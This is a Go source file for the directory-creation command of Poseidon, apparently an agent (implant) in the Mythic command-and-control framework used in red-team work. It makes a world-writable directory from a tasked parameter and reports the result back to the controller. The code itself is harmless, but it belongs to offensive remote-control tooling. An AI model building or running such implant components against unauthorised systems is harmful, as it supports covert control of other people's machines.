package mkdir

import (
	// Standard

	"fmt"
	"os"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

func Run(task structs.Task) {
	msg := task.NewResponse()
	err := os.Mkdir(task.Params, 0777)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Created directory: %s", task.Params)
	task.Job.SendResponses <- msg
	return
}
